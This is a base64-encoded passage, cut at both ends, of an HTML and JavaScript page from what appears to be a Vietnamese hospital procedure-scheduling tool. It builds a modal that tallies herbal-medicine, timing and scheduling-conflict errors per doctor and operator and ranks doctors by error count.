SJwb3NpdGlvbjphYnNvbHV0ZTtpbnNldDowO2JhY2tncm91bmQ6cmdiYSgwLDAsMCwwLjUpIj48L2Rpdj4NCiAgPGRpdiByb2xlPSJkaWFsb2ciIGFyaWEtbW9kYWw9InRydWUiDQogICAgICAgc3R5bGU9InBvc2l0aW9uOmFic29sdXRlO3RvcDo2JTtsZWZ0OjUwJTt0cmFuc2Zvcm06dHJhbnNsYXRlWCgtNTAlKTsNCiAgICAgICAgICAgICAgd2lkdGg6bWluKDkwMHB4LDkydncpO21heC1oZWlnaHQ6ODZ2aDtvdmVyZmxvdzphdXRvOw0KICAgICAgICAgICAgICBiYWNrZ3JvdW5kOiNmZmY7Y29sb3I6IzAwMDtib3JkZXItcmFkaXVzOjEwcHg7Ym9yZGVyOjJweCBzb2xpZCAjMzQ5OGRiOw0KICAgICAgICAgICAgICBib3gtc2hhZG93OjAgOHB4IDI0cHggcmdiYSgwLDAsMCwuMjUpO2ZvbnQtZmFtaWx5OkludGVyLHNhbnMtc2VyaWYiPg0KICAgIDxkaXYgc3R5bGU9ImRpc3BsYXk6ZmxleDthbGlnbi1pdGVtczpjZW50ZXI7anVzdGlmeS1jb250ZW50OnNwYWNlLWJldHdlZW47cGFkZGluZzoxNHB4IDE2cHg7Ym9yZGVyLWJvdHRvbToxcHggc29saWQgI2U1ZTdlYiI+DQogICAgICA8aDMgc3R5bGU9Im1hcmdpbjowO2ZvbnQtc2l6ZToxOHB4Ij5Uw7NtIFThuq90IEzhu5dpPC9oMz4NCiAgICAgIDxidXR0b24gY2xhc3M9ImJ0biIgdHlwZT0iYnV0dG9uIiBpZD0ic3VtbWFyeUNsb3NlQnRuIj7EkMOzbmc8L2J1dHRvbj4NCiAgICA8L2Rpdj4NCiAgICA8ZGl2IGlkPSJzdW1tYXJ5Q29udGVudCIgc3R5bGU9InBhZGRpbmc6MTZweCAxOHB4O2ZvbnQtc2l6ZToxNHB4O2xpbmUtaGVpZ2h0OjEuNSI+PC9kaXY+DQogIDwvZGl2Pg0KPC9kaXY+DQo8c2NyaXB0Pg0KLy8gPT09PT0gVMOTTSBU4bquVCBM4buWSSAoU+G6r2MgdGh14buRYyAvIFNhaSB0aOG7nWkgZ2lhbiAvIFRyw7luZyBnaeG7nSkgPT09PT0NCihmdW5jdGlvbigpew0KICAvLyBDaHXhuqluIGhvw6EgdMOqbiBoaeG7g24gdGjhu4sNCiAgZnVuY3Rpb24gY2xlYW4ocyl7IHJldHVybiAoc3x8JycpLnRvU3RyaW5nKCkucmVwbGFjZSgvLC9nLCcnKS5yZXBsYWNlKC9ccysvZywnICcpLnRyaW0oKTsgfQ0KDQogIC8vIEdvbSBuaMOzbTogeyBbZG9jdG9yXTogeyB0b3RhbDogbnVtYmVyLCBieU9wZXJhdG9yOiBNYXA8b3AsIGNvdW50PiB9IH0NCiAgZnVuY3Rpb24gbWFrZUJ1Y2tldCgpeyByZXR1cm4geyB0b3RhbDowLCBieU9wZXJhdG9yOm5ldyBNYXAoKSB9OyB9DQogZnVuY3Rpb24gYnVtcChidWNrZXRNYXAsIGRvY3Rvciwgb3BlcmF0b3Ipew0KICBjb25zdCBkID0gKGRvY3Rvcnx8JycpLnRvU3RyaW5nKCkucmVwbGFjZSgvLC9nLCcnKS50cmltKCkgfHwgJ0tow7RuZyBjw7MnOw0KICBjb25zdCBvID0gKG9wZXJhdG9yfHwnJykudG9TdHJpbmcoKS5yZXBsYWNlKC8sL2csJycpLnRyaW0oKSB8fCAnS2jDtG5nIGPDsyc7DQogIGlmKCFidWNrZXRNYXAuaGFzKGQpKSBidWNrZXRNYXAuc2V0KGQsIHsgdG90YWw6MCwgYnlPcGVyYXRvcjpuZXcgTWFwKCkgfSk7DQogIGNvbnN0IGIgPSBidWNrZXRNYXAuZ2V0KGQpOw0KICBiLnRvdGFsKys7DQogIGIuYnlPcGVyYXRvci5zZXQobywgKGIuYnlPcGVyYXRvci5nZXQobyl8fDApKzEpOw0KfQ0KDQogIC8vIDEpIMSQ4bq/bSBT4bquQyBUSFXhu5BDIFRIQU5HDQpmdW5jdGlvbiBjb3VudEhlcmIoKXsNCiAgY29uc3QgaGVyYnMgPSBBcnJheS5pc0FycmF5KHdpbmRvdy5hbGxIZXJiUHJvY2VkdXJlcykgPyB3aW5kb3cuYWxsSGVyYlByb2NlZHVyZXMgOiBbXTsNCiAgY29uc3Qgbm9ybSA9IHMgPT4gKHN8fCcnKS50b1N0cmluZygpLnJlcGxhY2UoL1ss77yMXStccyokLywnJykucmVwbGFjZSgvXHMrL2csJyAnKS50cmltKCkudG9Mb3dlckNhc2UoKTsNCg0KICAvLyAxKSDEkOG6v20gdOG6p24gc3XhuqV0IG5nxrDhu51pIHRo4buxYyBoaeG7h24gdGhlbyB04burbmcgbmfDoHkNCiAgY29uc3QgYnlEYXRlID0gT2JqZWN0LmNyZWF0ZShudWxsKTsNCiAgaGVyYnMuZm9yRWFjaChoPT57DQogICAgY29uc3QgZCA9IGguZGF0ZTsNCiAgICBjb25zdCBvcCA9IG5vcm0oaC5vcGVyYXRvcik7DQogICAgaWYoIW9wIHx8IG9wID09PSAna2jDtG5nIGPDsycpIHJldHVybjsgICAgICAgICAgICAvLyBi4buPIHRy4buRbmcva2jDtG5nIGPDsw0KICAgIChieURhdGVbZF18fChieURhdGVbZF09T2JqZWN0LmNyZWF0ZShudWxsKSkpW29wXSA9IChieURhdGVbZF1bb3BdfHwwKSArIDE7DQogIH0pOw0KDQogIC8vIDIpIFTDrW5oICLEkWEgc+G7kSIgKHRvcCBwaOG6o2kgbOG7m24gaMahbiBzZWNvbmQpDQogIGNvbnN0IG1ham9yaXR5ID0gT2JqZWN0LmNyZWF0ZShudWxsKTsNCiAgT2JqZWN0LmtleXMoYnlEYXRlKS5mb3JFYWNoKGQ9PnsNCiAgICBjb25zdCBhcnIgPSBPYmplY3QuZW50cmllcyhieURhdGVbZF0pLnNvcnQoKGEsYik9PmJbMV0tYVsxXSk7DQogICAgY29uc3QgdG9wICAgID0gYXJyWzBdIHx8IFtudWxsLDBdOw0KICAgIGNvbnN0IHNlY29uZCA9IGFyclsxXSB8fCBbbnVsbCwwXTsNCiAgICBtYWpvcml0eVtkXSA9IHsgdG9wOiB0b3BbMF0sIHRvcENvdW50OiB0b3BbMV0sIHNlY29uZENvdW50OiBzZWNvbmRbMV0gfTsNCiAgfSk7DQoNCiAgLy8gMykgQ2jhu4kgY+G7mW5nIG5o4buvbmcgY2EgS0jDgUMgxJBBIFPhu5AsIGdvbSB0aGVvIELDoWMgc8SpIGNo4buJIMSR4buLbmggKGPDonkgY2jDrW5oKQ0KICBjb25zdCBtYXAgPSBuZXcgTWFwKCk7IC8vIHsgZG9jdG9yID0+IHt0b3RhbCwgYnlPcGVyYXRvcn0gfSAgKGJ5T3BlcmF0b3Igc+G6vSBraMO0bmcgaGnhu4NuIHRo4buLKQ0KICBoZXJicy5mb3JFYWNoKGg9PnsNCiAgICBjb25zdCBkID0gaC5kYXRlOw0KICAgIGNvbnN0IG9wID0gbm9ybShoLm9wZXJhdG9yKTsNCiAgICBpZighb3AgfHwgb3AgPT09ICdraMO0bmcgY8OzJykgcmV0dXJuOw0KICAgIGNvbnN0IG0gPSBtYWpvcml0eVtkXTsNCiAgICBpZighbSkgcmV0dXJuOw0KICAgIGlmKG0udG9wICYmIG0udG9wQ291bnQgPiBtLnNlY29uZENvdW50ICYmIG9wICE9PSBtLnRvcCl7DQogICAgICAvLyBjaOG7iSB0w61uaCB0aGVvIGLDoWMgc8SpIGNo4buJIMSR4buLbmggKGPDonkgY2jDrW5oKQ0KICAgICAgYnVtcChtYXAsIGguZG9jdG9yLCAnJyk7ICAvLyAnYnlPcGVyYXRvcicgc+G6vSBi4buLIOG6qW4g4bufIHBo4bqnbiByZW5kZXINCiAgICB9DQogIH0pOw0KDQogIHJldHVybiBtYXA7DQp9DQoNCiAgLy8gMikgxJDhur9tIFNBSSBUSOG7nEkgR0lBTiAobeG7jWkgbOG7l2kgdHJvbmcgZXJyb3JMb2cgY29pIGzDoCBs4buXaSB0aOG7nWkgZ2lhbikNCiBmdW5jdGlvbiBjb3VudFRpbWVFcnJvcnMoKXsNCiAgY29uc3QgbWFwID0gbmV3IE1hcCgpOw0KDQogIC8vIEzhuqV5IHThu6sgbeG6o25nIGVycm9yTG9nIChraeG7g3UgbGV0IHRvw6BuIGPhu6VjKQ0KICBjb25zdCBsaXN0ID0NCiAgICAodHlwZW9mIGVycm9yTG9nICE9PSAndW5kZWZpbmVkJyAmJiBBcnJheS5pc0FycmF5KGVycm9yTG9nKSkgPyBlcnJvckxvZyA6DQogICAgKEFycmF5LmlzQXJyYXkod2luZG93LmVycm9yTG9nKSA/IHdpbmRvdy5lcnJvckxvZyA6IFtdKTsNCg0KICAvLyBDaOG7iSBs4bqleSBs4buXaSBs4buHY2ggdGjhu51pIGzGsOG7o25nIChjw7MgZXhwZWN0ZWQvYWN0dWFsKQ0KICBsaXN0LmZvckVhY2goZSA9PiB7DQogICAgY29uc3QgZCA9IGUgJiYgZS5kZXRhaWxzOw0KICAgIGlmICghZCkgcmV0dXJuOw0KICAgIGlmICh0eXBlb2YgZC5leHBlY3RlZCA9PT0gJ251bWJlcicgJiYgdHlwZW9mIGQuYWN0dWFsID09PSAnbnVtYmVyJykgew0KICAgICAgYnVtcChtYXAsIGQuZG9jdG9yLCBkLm9wZXJhdG9yKTsNCiAgICB9DQogIH0pOw0KDQogIC8vIEZhbGxiYWNrOiDEkeG7jWMgdHLhu7FjIHRp4bq/cCB04burIGLhuqNuZyBs4buXaSB0aOG7nWkgZ2lhbiBu4bq/dSB2w6wgbMO9IGRvIG7DoG8gxJHDsyBt4bqjbmcgcuG7l25nDQogIGlmIChtYXAuc2l6ZSA9PT0gMCkgew0KICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJyNlcnJvckxvZyB0ci5lcnJvci1yb3cnKS5mb3JFYWNoKHRyID0+IHsNCiAgICAgIGNvbnN0IHRkcyA9IHRyLnF1ZXJ5U2VsZWN0b3JBbGwoJ3RkJyk7DQogICAgICAvLyBC4bqjbmcgY8OzIGPhu5l0OiBUw6puIEJOIHwgVGjhu6cgdGh14bqtdCB8IELDoWMgc+G7uSBjaOG7iSDEkeG7i25oIHwgTmfGsOG7nWkgdGjhu7FjIGhp4buHbiB8IFRo4budaSBnaWFuIHwgTOG7l2kNCiAgICAgIGNvbnN0IGRvY3RvciAgID0gdGRzWzJdPy50ZXh0Q29udGVudD8udHJpbSgpOw0KICAgICAgY29uc3Qgb3BlcmF0b3IgPSB0ZHNbM10/LnRleHRDb250ZW50Py50cmltKCk7DQogICAgICBpZiAoZG9jdG9yIHx8IG9wZXJhdG9yKSBidW1wKG1hcCwgZG9jdG9yLCBvcGVyYXRvcik7DQogICAgfSk7DQogIH0NCg0KICByZXR1cm4gbWFwOw0KfQ0KDQogIC8vIDMpIMSQ4bq/bSBUUsOZTkcgR0nhu5wgKHThu6sgYWxsUHJvY2VkdXJlcy5jb25mbGljdD10cnVlKQ0KZnVuY3Rpb24gY291bnRDb25mbGljdHMoKXsNCiAgY29uc3QgbGlzdCA9DQogICAgKHR5cGVvZiBhbGxQcm9jZWR1cmVzICE9PSAndW5kZWZpbmVkJyAmJiBBcnJheS5pc0FycmF5KGFsbFByb2NlZHVyZXMpKSA/IGFsbFByb2NlZHVyZXMgOg0KICAgIChBcnJheS5pc0FycmF5KHdpbmRvdy5hbGxQcm9jZWR1cmVzKSA/IHdpbmRvdy5hbGxQcm9jZWR1cmVzIDogW10pOw0KICBjb25zdCBtYXAgPSBuZXcgTWFwKCk7DQogIGxpc3QuZm9yRWFjaChwID0+IHsNCiAgICBpZiAocCAmJiBwLmNvbmZsaWN0KSBidW1wKG1hcCwgcC5kb2N0b3IsIHAub3BlcmF0b3IpOw0KICB9KTsNCiAgcmV0dXJuIG1hcDsNCn0NCmZ1bmN0aW9uIGJ1aWxkRG9jdG9yUmFua2luZyhoZXJiTWFwLCB0aW1lTWFwLCBjb25mTWFwKXsNCiAgY29uc3QgdG90YWxNYXAgPSBuZXcgTWFwKCk7DQoNCiAgLy8gZ+G7mXAgc+G7kSB04burIDMgbWFwDQogIGNvbnN0IG1lcmdlID0gKHNyYykgPT4gew0KICAgIHNyYy5mb3JFYWNoKChpbmZvLCBkb2MpPT57DQogICAgICBpZighdG90YWxNYXAuaGFzKGRvYykpIHRvdGFsTWFwLnNldChkb2Mse3RvdGFsOjB9KTsNCiAgICAgIHRvdGFsTWFwLmdldChkb2MpLnRvdGFsICs9IGluZm8udG90YWw7DQogICAgfSk7DQogIH07DQogIG1lcmdlKGhlcmJNYXApOyBtZXJnZSh0aW1lTWFwKTsgbWVyZ2UoY29uZk1hcCk7DQoNCiAgLy8gc29ydCBnaeG6o20gZOG6p24NCiAgY29uc3QgYXJyID0gQXJyYXkuZnJvbSh0b3RhbE1hcC5lbnRyaWVzKCkpLnNvcnQoKGEsYik9PmJbMV0udG90YWwgLSBhWzFdLnRvdGFsKTsNCg0KICBsZXQgaHRtbCA9IGA8ZGl2IGNsYXNzPSJzZWN0aW9uIj48ZGl2IGNsYXNzPSJpbm5lciI+YDsNCiAgaWYoYXJyLmxlbmd0aD09PTApew0KICAgIGh0bWwgKz0gYDxkaXYgY2xhc3M9Im5vdGUtZW1wdHkiPkNoxrBhIGPDsyBk4buvIGxp4buHdTwvZGl2PmA7DQogIH0gZWxzZSB7DQogICAgaHRtbCArPSBgPHRhYmxlIGNsYXNzPSJ0YWJsZS1jbGVhbiI+PHRoZWFkPjx0cj4NCiAgICAgICAgICAgICAgPHRoPkjhuqFuZzwvdGg+PHRoPkLDoWMgc8SpPC90aD4NCiAgICAgICAgICAgICAgPHRoIGNsYXNzPSJyaWdodCI+VOG7lW5nIGzhu5dpPC90aD4NCiAgICAgICAgICAgIDwvdHI+PC90aGVhZD48dGJvZHk+YDsNCiAgICBhcnIuZm9yRWFjaCgoW2RvYyxpbmZvXSxpKT0+ew0KICAgICAgaHRtbCArPSBgPHRyPg0KICAgICAgICA8dGQ+JHtpKzF9PC90ZD4NCiAgICAgICAgPHRkPjxiPiR7ZG9jfTwvYj48L3RkPg0KICAgICAgICA8dGQgY2xhc3M9InJpZ2h0Ij4ke2luZm8udG90YWx9PC90ZD4NCiAgICAgIDwvdHI+YDsNCiAgICB9KTsNCiAgICBodG1sICs9IGA8L3Rib2R5PjwvdGFibGU+YDsNCiAgfQ0KICBodG1sICs9IGA8L2Rpdj48L2Rpdj5gOw0KICByZXR1cm4gaHRtbDsNCn0NCiAgLy8gUmVuZGVyIDEgc2VjdGlvbg0KZnVuY3Rpb24gcmVuZGVyU2VjdGlvbih0aXRsZSwgbWFwLCBzaG93T3BlcmF0b3JzID0gdHJ1ZSl7DQogIGlmKCFtYXAgfHwgbWFwLnNpemU9PT0wKXsNCiAgICByZXR1cm4gYDxoNCBzdHlsZT0ibWFyZ2luOjEwcHggMCA2cHgiPiR7dGl0bGV9PC9oND48ZGl2PjxpPkNoxrBhIGPDsyBk4buvIGxp4buHdTwvaT48L2Rpdj5gOw0KICB9DQogIGNvbnN0IGRvY3RvcnMgPSBBcnJheS5mcm9tKG1hcC5lbnRyaWVzKCkpLnNvcnQoKGEsYik9PmJbMV0udG90YWwgLSBhWzFdLnRvdGFsKTsNCg0KICBsZXQgaHRtbCA9IGA8aDQgc3R5bGU9Im1hcmdpbjoxMHB4IDAgNnB4Ij4ke3RpdGxlfTwvaDQ+PGRpdiBzdHlsZT0iYm9yZGVyOjFweCBzb2xpZCAjZWVlO2JvcmRlci1yYWRpdXM6OHB4O3BhZGRpbmc6MTJweCI+YDsNCiAgZG9jdG9ycy5mb3JFYWNoKChbZG9jdG9yLCBpbmZvXSk9PnsNCiAgICBodG1sICs9IGA8ZGl2IHN0eWxlPSJtYXJnaW4tYm90dG9tOjEwcHgiPg0KICAgICAgPGRpdj5Cw6FjIHPEqSA8Yj4ke2RvY3Rvcn06PC9iPiAke2luZm8udG90YWx9PC9kaXY+YDsNCiAgICBpZiAoc2hvd09wZXJhdG9ycyl7DQogICAgICBjb25zdCBvcHMgPSBBcnJheS5mcm9tKGluZm8uYnlPcGVyYXRvci5lbnRyaWVzKCkpLnNvcnQoKGEsYik9PmJbMV0tYVsxXSk7DQogICAgICBpZihvcHMubGVuZ3RoKXsNCiAgICAgICAgaHRtbCArPSBgPGRpdiBzdHlsZT0ibWFyZ2luLWxlZnQ6MTJweDttYXJnaW4tdG9wOjRweCI+YCArDQogICAgICAgICAgICAgICAgb3BzLm1hcCgoW29wLGNdKSA9PiBgLSAke29wfTogJHtjfWApLmpvaW4oJzxicj4nKSArDQogICAgICAgICAgICAgICAgYDwvZGl2PmA7DQogICAgICB9DQogICAgfQ0KICAgIGh0bWwgKz0gYDwvZGl2PmA7DQogIH0pOw0KICBodG1sICs9IGA8L2Rpdj5gOw0KICByZXR1cm4gaHRtbDsNCn0NCg0KICBmdW5jdGlvbiBidWlsZFN1bW1hcnlIVE1MKCl7DQogICAgY29uc3QgaGVyYk1hcCA9IGNvdW50SGVyYigpOw0KICAgIGNvbnN0IHRpbWVNYXAgPSBjb3VudFRpbWVFcnJvcnMoKTsNCiAgICBjb25zdCBjb25mTWFwID0gY291bnRDb25mbGljdHMoKTsNCg0KICAgIC8vIFThu5VuZyBuaGFuaCAoZMOybmcgxJHhuqd1KQ0KICAgIGNvbnN0IGhlcmJUb3RhbCA9IEFycmF5LmZyb20oaGVyYk1hcC52YWx1ZXMoKSkucmVkdWNlKChzLGIpPT5zK2IudG90YWwsMCk7DQogICAgY29uc3QgdGltZVRvdGFsID0gQXJyYXkuZnJvbSh0aW1lTWFwLnZhbHVlcygpKS5yZWR1Y2UoKHMsYik9PnMrYi50b3RhbCwwKTsNCiAgICBjb25zdCBjb25mVG90YWwgPSBBcnJheS5mcm9tKGNvbmZNYXAudmFsdWVzKCkpLnJlZHVjZSgocyxiKT0+cytiLnRvdGFsLDApOw0KDQogICAgbGV0IHRvcCA9IGAgPGRpdiBjbGFzcz0ic3VtbWFyeS13cmFwIj4NCiAgICAgIDxkaXYgY2xhc3M9ImtwaS1ncmlkIj4NCiAgICAgICAgPGRpdiBjbGFzcz0ia3BpLWNhcmQga3BpLWJsdWUiPg0KICAgICAgICAgIDxkaXYgY2xhc3M9ImtwaS10aXRsZSI+PGkgY2xhc3M9ImZhLXNvbGlkIGZhLW1vcnRhci1wZXN0bGUiPjwvaT4gU+G6r2MgdGh14buRYyB0aGFuZzwvZGl2Pg0KICAgICAgICAgIDxkaXYgY2xhc3M9ImtwaS12YWx1ZSI+JHtoZXJiVG90YWx9PC9kaXY+DQogICAgICAgIDwvZGl2Pg0KICAgICAgICA8ZGl2IGNsYXNzPSJrcGktY2FyZCBrcGktYW1iZXIiPg0KICAgICAgICAgIDxkaXYgY2xhc3M9ImtwaS10aXRsZSI+PGkgY2xhc3M9ImZhLXJlZ3VsYXIgZmEtY2xvY2siPjwvaT4gU2FpIHRo4budaSBnaWFuPC9kaXY+DQogICAgICAgICAgPGRpdiBjbGFzcz0ia3BpLXZhbHVlIj4ke3RpbWVUb3RhbH08L2Rpdj4NCiAgICAgICAgPC9kaXY+DQogICAgICAgIDxkaXYgY2xhc3M9ImtwaS1jYXJkIGtwaS1yZWQiPg0KICAgICAgICAgIDxkaXYgY2xhc3M9ImtwaS10aXRsZSI+PGkgY2xhc3M9ImZhLXNvbGlkIGZhLXRyaWFuZ2xlLWV4Y2xhbWF0aW9uIj48L2k+IFRyw7luZyBnaeG7nTwvZGl2Pg0KICAgICAgICAgIDxkaXYgY2xhc3M9ImtwaS12YWx1ZSI+JHtjb25mVG90YWx9PC9kaXY+DQogICAgICAgIDwvZGl2Pg0KICAgICAgPC9kaXY+YDsNCg0KICAgIHJldHVybiB0b3ANCiAgICAgICsgcmVuZGVyU2VjdGlvbignU+G6r2MgdGh14buRYyB0aGFuZycsIGhlcmJNYXAsIC8qc2hvd09wZXJhdG9ycyovIGZhbHNlKSANCiAgICAgICsgJzxici8+Jw0KICAgICAgKyByZW5kZXJTZWN0aW9uKCdTYWkgdGjhu51pIGdpYW4nLCB0aW1lTWFwKQ0KICAgICAgKyAnPGJyLz4nDQogICAgICArIHJlbmRlclNlY3Rpb24oJ1Ryw7luZyBnaeG7nScsIGNvbmZNYXApOw0KICB9DQoNCiAgLy8gTeG7ny/EkcOzbmcgbW9kYWwNCiAgd2luZG93Lm9wZW5FcnJvclN1bW1hcnkgPSBmdW5jdGlvbigpew0KICAgIGNvbnN0IG1vZGFsID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3N1bW1hcnlNb2RhbCcpOw0KICAgIGNvbnN0IGNvbnRlbnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc3VtbWFyeUNvbnRlbnQnKTsNCiAgICBpZighbW9kYWwgfHwgIWNvbnRlbnQpIHJldHVybjsNCi8vIGzhuqV5IDMgbWFwIMSR4buDIHRydXnhu4FuIGNobyBi4bqjbmcgeOG6v3AgaOG6oW5nDQpjb25zdCBoZXJiTWFwID0gY291bnRIZXJiKCk7DQpjb25zdCB0aW1lTWFwID0gY291bnRUaW1lRXJyb3JzKCk7DQpjb25zdCBjb25mTWFwID0gY291bnRDb25mbGljdHMoKTsNCg0KLy8gbuG7mWkgZHVuZyBwb3B1cCA9IHBo4bqnbiB0w7NtIHThuq90IGPFqSArIGLhuqNuZyB44bq/cCBo4bqhbmcgYsOhYyBzxKkNCmNvbnRlbnQuaW5uZXJIVE1MID0gYnVpbGRTdW1tYXJ5SFRNTCgpDQogICsgYnVpbGREb2N0b3JSYW5raW5nKGhlcmJNYXAsIHRpbWVNYXAsIGNvbmZNYXApOw0KICAgIG1vZGFsLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICB9Ow0KICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc3VtbWFyeUNsb3NlQnRuJyk/LmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCk9PiB7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3N1bW1hcnlNb2RhbCcpLnN0eWxlLmRpc3BsYXk9J25vbmUnOw0KICB9KTsNCiAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3N1bW1hcnlCYWNrZHJvcCcpPy5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpPT4gew0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzdW1tYXJ5TW9kYWwnKS5zdHlsZS5kaXNwbGF5PSdub25lJzsNCiAgfSk7DQoNCiAgLy8gU2F1IGtoaSDigJxLaeG7g20gVHJh4oCdIHhvbmcsIGhp4buHbiBuw7p0IFTDs20gVOG6r3QgTOG7l2kgKHRoZW8gY8O5bmcgY8ahIGNo4bq/IG5oxrAgMiBuw7p0IGtpYSkNCiAgLy8gKMSQw6MgY8OzIGxvZ2ljIGhp4buHbiBuw7p0IHRyb25nIHNldFRpbWVvdXQgc2F1IGFuYWx5emUg4oCUIHRhIGNo4buJIMSR4bqjbSBi4bqjbyBuw7p0IG7DoHkgY8WpbmcgaGnhu4duKQ0KICBjb25zdCBvcmlnID0gc2V0VGltZW91dDsNCiAgLy8gS2jDtG5nIGPhuqduIGhvb2ssIHbDrCBjb2RlIGPDsyDEkW/huqFuOg0KICAvLyBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdidXR0b24uYnRuJykuZm9yRWFjaChidG4gPT4gew0KICAvLyAgIGlmIChidG4udGV4dENvbnRlbnQuaW5jbHVkZXMoJ0dp4budIHRy4buRbmcnKSB8fCBidG4udGV4dENvbnRlbnQuaW5jbHVkZXMoJ1Phuq9jIHRodeG7kWMgdGhhbmcnKSkgeyBidG4uc3R5bGUuZGlzcGxheT0naW5saW5lLWJsb2NrJzt9DQogIC8vIH0pOw0KICAvLyAtPiBUYSB0aMOqbSBkw7JuZyBkxrDhu5tpIMSR4buDIG7DunQgbeG7m2kgY8WpbmcgxJHGsOG7o2MgYuG6rXQ6DQogIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ0RPTUNvbnRlbnRMb2FkZWQnLCAoKSA9PiB7DQogICAgLy8gS2hpIHBvcHVwIGxvYWRpbmcgdOG6r3Qgc2F1IGFuYWx5emUsIHRhIGLhuq10IHRo4bunIGPDtG5nIG7hur91IMSRw6MgY8OzIGThu68gbGnhu4d1Og0KICAgIC8vIChhbiB0b8OgbiBu4bq/dSBn4buNaSBuaGnhu4F1IGzhuqduKQ0KICAgIGNvbnN0IHNob3dJZkRhdGEgPSAoKSA9PiB7DQogICAgICBpZiAoQXJyYXkuaXNBcnJheSh3aW5kb3cuYWxsUHJvY2VkdXJlcykgJiYgd2luZG93LmFsbFByb2NlZHVyZXMubGVuZ3RoKXsNCiAgICAgICAgY29uc3QgYiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvclN1bW1hcnlCdG4nKTsNCiAgICAgICAgaWYgKGIpIGIuc3R5bGUuZGlzcGxheSA9ICdpbmxpbmUtYmxvY2snOw0KICAgICAgfQ0KICAgIH07DQogICAgLy8gY2jhuqF5IG5nYXkgdsOgIHNhdSBt4buXaSBs4bqnbiBs4buNYy9yZW5kZXINCiAgICBzaG93SWZEYXRhKCk7DQogICAgLy8gZ+G6r24gdsOgbyBjw6FjIMSRaeG7g20gxJHDoyBjw7M6DQogICAgY29uc3QgcmIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncmVzdWx0Qm9keScpOw0KICAgIGNvbnN0IGVsID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9yTG9nJyk7DQogICAgY29uc3Qgb2JzID0gbmV3IE11dGF0aW9uT2JzZXJ2ZXIoc2hvd0lmRGF0YSk7DQogICAgaWYgKHJiKSBvYnMub2JzZXJ2ZShyYiwge2NoaWxkTGlzdDp0cnVlLHN1YnRyZWU6dHJ1ZX0pOw0KICAgIGlmIChlbCkgb2JzLm9ic2VydmUoZWwsIHtjaGlsZExpc3Q6dHJ1ZSxzdWJ0cmVlOnRydWV9KTsNCiAgfSk7DQp9KSgpOw0KPC9zY3JpcHQ+DQoNCjxzY3JpcHQ+DQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJywgKCkgPT4gew0KICBjb25zdCBidG4gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZXJyb3JTdW1tYXJ5QnRuJyk7DQogIGNvbnN0IGhlcmJCdG4gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaGVyYlRvZ2dsZUJ0bicpOw0KICBjb25zdCBhdmFpbEJ0biA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2J1dHRvbi5idG5bb25jbGljaz0idG9nZ2xlQXZhaWxhYmlsaXR5KCkiXScpOw0KDQogIGZ1bmN0aW9uIHN5bmNTaG93KCl7DQogICAgaWYgKCFidG4pIHJldHVybjsNCiAgICBjb25zdCBoZXJiU2hvd24gID0gaGVyYkJ0biAmJiBnZXRDb21wdXRlZFN0eWxlKGhlcmJCdG4pLmRpc3BsYXkgIT09ICdub25lJzsNCiAgICBjb25zdCBhdmFpbFNob3duID0gYXZhaWxCdG4gJiYgZ2V0Q29tcHV0ZWRTdHlsZShhdmFpbEJ0bikuZGlzcGxheSAhPT0gJ25vbmUnOw0KICAgIGlmIChoZXJiU2hvd24gfHwgYXZhaWxTaG93bikgYnRuLnN0eWxlLmRpc3BsYXkgPSAnaW5saW5lLWJsb2NrJzsNCiAgfQ0KDQogIC8vIGNo4bqheSBuZ2F5IHbDoCBraGkgY8OzIHRoYXkgxJHhu5VpIGhp4buDbiB0aOG7iw0KICBzeW5jU2hvdygpOw0KICBuZXcgTXV0YXRpb25PYnNlcnZlcihzeW5jU2hvdykub2JzZXJ2ZShkb2N1bWVudC5ib2R5LCB7DQogICAgYXR0cmlidXRlczogdHJ1ZSwgc3VidHJlZTogdHJ1ZSwgYXR0cmlidXRlRmlsdGVyOiBbJ3N0eWxlJywnY2xhc3MnXQ0KICB9KTsNCn0pOw0KDQoNCjwvc2NyaXB0Pg0KPCEtLSBNb2RhbCBGcmFtZTogVOG6oW8gZ2nhu50gdGjhu6cgdGh14bqtdCAtLT4NCjxkaXYgaWQ9InByb2NlZHVyZUZyYW1lTW9kYWwiIHN0eWxlPSJkaXNwbGF5Om5vbmU7cG9zaXRpb246Zml4ZWQ7aW5zZXQ6MDt6LWluZGV4OjExMDcwOyI+DQogIDxkaXYgc3R5bGU9InBvc2l0aW9uOmFic29sdXRlO2luc2V0OjA7YmFja2dyb3VuZDpyZ2JhKDAsMCwwLDAuNSkiIG9uY2xpY2s9ImNsb3NlUHJvY2VkdXJlU2NoZWR1bGVyKCkiPjwvZGl2Pg0KICA8ZGl2IHN0eWxlPSINCiAgICAgIHBvc2l0aW9uOmFic29sdXRlO3RvcDo0JTtsZWZ0OjUwJTt0cmFuc2Zvcm06dHJhbnNsYXRlWCgtNTAlKTsNCiAgICAgIHdpZHRoOm1pbigxMjAwcHgsOTZ2dyk7aGVpZ2h0Ojkwdmg7DQogICAgICBiYWNrZ3JvdW5kOiNmZmY7Y29sb3I6IzAwMDtib3JkZXItcmFkaXVzOjEwcHg7Ym9yZGVyOjJweCBzb2xpZCAjMzQ5OGRiOw0KICAgICAgYm94LXNoYWRvdzowIDhweCAyNHB4IHJnYmEoMCwwLDAsLjI1KTtkaXNwbGF5OmZsZXg7ZmxleC1kaXJlY3Rpb246Y29sdW1uIj4NCiAgICA8ZGl2IHN0eWxlPSJkaXNwbGF5OmZsZXg7Y